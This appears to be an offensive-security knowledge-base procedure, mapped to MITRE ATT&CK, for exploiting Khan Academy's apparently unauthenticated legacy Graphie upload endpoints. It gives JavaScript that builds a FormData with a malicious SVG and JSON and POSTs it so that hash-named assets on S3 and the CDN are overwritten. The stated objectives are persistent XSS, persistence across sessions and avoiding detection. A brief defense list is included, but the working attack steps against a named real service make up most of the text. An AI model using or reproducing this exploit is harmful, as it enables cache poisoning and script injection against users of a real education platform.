---
id: proc-upload-graphie-001
name: Upload-Malicious-Graphie-via-Legacy-API
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.276Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
tags:
  - xss
  - upload
  - api-exploit
commands:
  - '[[commands/upload-malicious-graphie-fetch]]'
platforms:
  - Web
tools: []
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Upload-Malicious-Graphie-via-Legacy-API

## Summary

This procedure uploads malicious Graphie payloads to Khan Academy's legacy API, overriding existing files on S3 and CDN based on hash, enabling persistent XSS injection.

## Description

The legacy endpoints (graphie-to-png.kasandbox.org/svg or graphie-to-png.khanacademy.systems/svg) accept FormData POSTs without auth, storing files by hash. By appending malicious SVG/JSON, attackers replace assets used on khanacademy.org. Expected outcome: File override confirmed by server response, leading to cache pollution.

## Requirements

1. Prepared payloads from prior procedure
2. Browser or Node.js environment for fetch
3. Target endpoint URL and file hash

## Defense

Defensive measures and detection strategies:

- Authenticate API uploads
- Validate and sanitize all incoming SVG/JSON
- Rate-limit POSTs to legacy endpoints

## Objectives

1. Override CDN/S3 asset with malicious content
2. Ensure persistence across sessions
3. Avoid immediate detection via hash-based storage

## Instructions

### Step 1: Prepare FormData

**Context**: Assemble original and malicious data into FormData.

Use [[commands/upload-malicious-graphie-fetch]] preparation:

```javascript
var form = new FormData();
form.append("js", ORIGINAL_JS);  // e.g., original graphie JS code
form.append("svg", XSS_SVG);     // Malicious SVG string
form.append("other_data", JSON.stringify(XSS_JSON));  // Stringified malicious JSON
```

> Builds multipart form. Expected output: Populated FormData object.

### Step 2: POST to API

**Context**: Send to endpoint to trigger override.

Execute [[commands/upload-malicious-graphie-fetch]]:

```javascript
await fetch("http://graphie-to-png.kasandbox.org/svg", {
  "method": "POST",
  "body": form
}).then(r => r.text());
```

> Targets hash-based override (e.g., for 2122427aa8dc4ef2a59058bc1a7a934ba6ca6747.svg). Expected output: Server text response (e.g., success message).

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/upload-malicious-graphie-fetch]]

## Tools Used


## Tags

- [[xss]]
- [[upload]]
